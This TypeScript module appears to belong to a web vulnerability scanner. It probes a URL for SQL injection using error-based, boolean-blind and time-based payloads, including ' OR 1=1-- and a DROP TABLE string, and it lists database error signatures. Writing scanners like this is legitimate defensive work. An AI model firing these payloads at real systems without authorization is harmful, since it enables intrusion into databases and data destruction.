import { http } from '../../utils/http'
import { Finding } from '@vuln-scanner/shared-types'

const CAT = 'injection'

const ERROR_PAYLOADS = [
  "'", "''", "\"", "1'", "1\"",
  "' OR '1'='1", "' OR 1=1--", "' OR 1=1#",
  "\" OR 1=1--", "1; DROP TABLE users--",
  "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
  "1' AND 1=CONVERT(int,'a')--",
  "' AND 1=1 UNION SELECT NULL--",
]

const BLIND_PAIRS = [
  { true: "1' AND '1'='1", false: "1' AND '1'='2" },
  { true: "1 AND 1=1",     false: "1 AND 1=2"     },
  { true: "1' AND 1=1--",  false: "1' AND 1=2--"  },
]

const TIME_PAYLOADS = [
  "1'; WAITFOR DELAY '0:0:5'--",
  "1' AND SLEEP(5)--",
  "1'; SELECT pg_sleep(5)--",
  "1 AND SLEEP(5)--",
]

const ERROR_SIGNATURES = [
  // MySQL
  'you have an error in your sql syntax',
  'warning: mysql', 'mysql_fetch', 'mysql_num_rows',
  'mysql_query', 'mysql_result',
  // PostgreSQL
  'pg_query', 'pg_exec', 'syntax error at or near',
  'unterminated quoted string', 'postgresql',
  // MSSQL
  'microsoft sql server', 'odbc sql server driver',
  'unclosed quotation mark', 'incorrect syntax near',
  'mssql_query', 'odbc_exec',
  // Oracle
  'ora-00907', 'ora-00933', 'ora-00921', 'oracle error',
  // SQLite
  'sqlite3::', 'sqlite_error', 'sqliteexception',
  // Generic
  'sql syntax', 'sql error', 'database error',
  'db error', 'sqlexception', 'jdbc', 'pg::error',
]

const SENSITIVE_KEYS = [
  'email', 'username', 'password', 'token', 'secret',
  'phone', 'address', 'ssn', 'credit', 'account',
  'user_id', 'userid', 'private',
]

function containsSQLError(body: string): string | null {
  const lower = body.toLowerCase()
  return ERROR_SIGNATURES.find(sig => lower.includes(sig)) ?? null
}

function containsSensitiveData(body: string): boolean {
  const lower = body.toLowerCase()
  return SENSITIVE_KEYS.some(k => lower.includes(k))
}

// Build GET test URLs by injecting into each param
function buildGetUrls(originalUrl: string, payload: string): { url: string; param: string }[] {
  const parsed = new URL(originalUrl)
  const results: { url: string; param: string }[] = []

  for (const key of parsed.searchParams.keys()) {
    const modified = new URL(originalUrl)
    modified.searchParams.set(key, payload)
    results.push({ url: modified.toString(), param: key })
  }

  // No params — try common param names
  if (results.length === 0) {
    for (const param of ['id', 'q', 'search', 'query', 'cat', 'page', 'item', 'user']) {
      const modified = new URL(originalUrl)
      modified.searchParams.set(param, payload)
      results.push({ url: modified.toString(), param })
    }
  }

  return results
}

// Build POST body payloads for common field names
function buildPostBodies(payload: string): { body: Record<string, string>; fields: string }[] {
  return [
    {
      body:   { username: payload, password: 'test123' },
      fields: 'username',
    },
    {
      body:   { email: payload, password: 'test123' },
      fields: 'email',
    },
    {
      body:   { search: payload },
      fields: 'search',
    },
    {
      body:   { q: payload },
      fields: 'q',
    },
    {
      body:   { id: payload },
      fields: 'id',
    },
  ]
}

export async function sqliCheck(url: string): Promise<Finding[]> {
  const findings: Finding[] = []
  const reported = new Set<string>()

  // ── 1. Error-based — GET params ──────────────────────────────────────────
  outer:
  for (const payload of ERROR_PAYLOADS) {
    const targets = buildGetUrls(url, payload)

    for (const { url: testUrl, param } of targets) {
      if (reported.has(`error-get-${param}`)) continue
      try {
        const res = await http.get(testUrl, { timeout: 8000 })
        const body = String(res.data)
        const matched = containsSQLError(body)

        if (matched) {
          reported.add(`error-get-${param}`)
          findings.push({
            category:    CAT,
            checkName:   'sqli-error-based',
            severity:    'CRITICAL',
            title:       `SQL injection (error-based) — GET param "${param}"`,
            description: 'The server returned a raw database error in response to a crafted SQL payload, confirming the parameter is injectable.',
            evidence:    `URL: ${testUrl}\nPayload: ${payload}\nDB signature: "${matched}"\nSnippet: ${body.slice(0, 400)}`,
            remediation: 'Use parameterized queries / prepared statements. Never concatenate user input into SQL. Apply a WAF as a secondary layer.',
          })
          break outer
        }
      } catch { /* skip */ }
    }
  }

  // ── 2. Error-based — POST body ───────────────────────────────────────────
  if (!reported.has('error-post')) {
    for (const payload of ERROR_PAYLOADS.slice(0, 6)) {
      const bodies = buildPostBodies(payload)

      for (const { body, fields } of bodies) {
        if (reported.has(`error-post-${fields}`)) continue
        try {
          const res = await http.post(url, body, {
            headers: { 'Content-Type': 'application/json' },
            timeout: 8000,
          })
          const text = String(res.data)
          const matched = containsSQLError(text)

          if (matched) {
            reported.add(`error-post-${fields}`)
            findings.push({
              category:    CAT,
              checkName:   'sqli-error-based-post',
              severity:    'CRITICAL',
              title:       `SQL injection (error-based) — POST field "${fields}"`,
              description: 'A POST request body field triggered a raw database error, confirming SQL injection in a form/API endpoint.',
              evidence:    `URL: ${url}\nField: ${fields}\nPayload: ${payload}\nDB signature: "${matched}"\nSnippet: ${text.slice(0, 400)}`,
              remediation: 'Use parameterized queries for all database operations. Validate and sanitize all POST body fields before using them in queries.',
            })
            break
          }
        } catch { /* skip */ }
      }

      if (findings.some(f => f.checkName === 'sqli-error-based-post')) break
    }
  }

  // ── 3. Boolean-blind — GET params ────────────────────────────────────────
  if (findings.length === 0) {
    for (const pair of BLIND_PAIRS) {
      const trueTargets  = buildGetUrls(url, pair.true)
      const falseTargets = buildGetUrls(url, pair.false)

      for (let i = 0; i < trueTargets.length; i++) {
        const { param } = trueTargets[i]
        if (reported.has(`blind-${param}`)) continue

        try {
          const [trueRes, falseRes] = await Promise.all([
            http.get(trueTargets[i].url,  { timeout: 8000 }),
            http.get(falseTargets[i].url, { timeout: 8000 }),
          ])

          const trueBody  = String(trueRes.data)
          const falseBody = String(falseRes.data)
          const lenDiff   = Math.abs(trueBody.length - falseBody.length)
          const statusDiff = trueRes.status !== falseRes.status
          const hasSensitive = containsSensitiveData(trueBody)

          // Confidence scoring
          let confidence = 0
          if (lenDiff > 500)   confidence += 40
          else if (lenDiff > 200) confidence += 20
          if (statusDiff)      confidence += 40
          if (hasSensitive)    confidence += 20

          if (confidence >= 40) {
            reported.add(`blind-${param}`)
            const sevMap: Record<number, Finding['severity']> = {
              80: 'CRITICAL', 60: 'HIGH', 40: 'MEDIUM'
            }
            const sev = confidence >= 80 ? 'CRITICAL'
                      : confidence >= 60 ? 'HIGH'
                      : 'MEDIUM'

            findings.push({
              category:    CAT,
              checkName:   'sqli-boolean-blind',
              severity:    sev,
              title:       `SQL injection (boolean-blind) — param "${param}" [${confidence}% confidence]`,
              description: `True and false SQL conditions produced measurably different responses on param "${param}". This indicates a blind SQL injection point that attackers can use to extract data character by character.`,
              evidence: [
                `True:  ${trueTargets[i].url} → ${trueRes.status} (${trueBody.length} bytes)`,
                `False: ${falseTargets[i].url} → ${falseRes.status} (${falseBody.length} bytes)`,
                `Length diff: ${lenDiff} bytes | Status diff: ${statusDiff}`,
                `Sensitive data in response: ${hasSensitive}`,
                `Confidence: ${confidence}%`,
              ].join('\n'),
              remediation: 'Use parameterized queries. Blind SQLi is just as dangerous as error-based — full DB extraction is possible without any visible error.',
            })
            break
          }
        } catch { /* skip */ }
      }

      if (findings.length > 0) break
    }
  }

  // ── 4. Time-based blind ──────────────────────────────────────────────────
  if (findings.length === 0) {
    for (const payload of TIME_PAYLOADS) {
      const targets = buildGetUrls(url, payload)

      for (const { url: testUrl, param } of targets) {
        if (reported.has(`time-${param}`)) continue
        try {
          const start   = Date.now()
          await http.get(testUrl, { timeout: 12000 })
          const elapsed = Date.now() - start

          if (elapsed >= 4500) {
            reported.add(`time-${param}`)
            findings.push({
              category:    CAT,
              checkName:   'sqli-time-based',
              severity:    'CRITICAL',
              title:       `SQL injection (time-based blind) — param "${param}"`,
              description: `A time-delay SQL payload caused the server to respond ${(elapsed / 1000).toFixed(1)}s later than normal. The database engine executed the injected SLEEP/WAITFOR command.`,
              evidence:    `URL: ${testUrl}\nPayload: ${payload}\nResponse time: ${elapsed}ms (threshold: 4500ms)`,
              remediation: 'Use parameterized queries. Time-based SQLi enables full data extraction with no visible output — just slower.',
            })
            break
          }
        } catch { /* skip */ }
      }

      if (findings.length > 0) break
    }
  }

  return findings
}
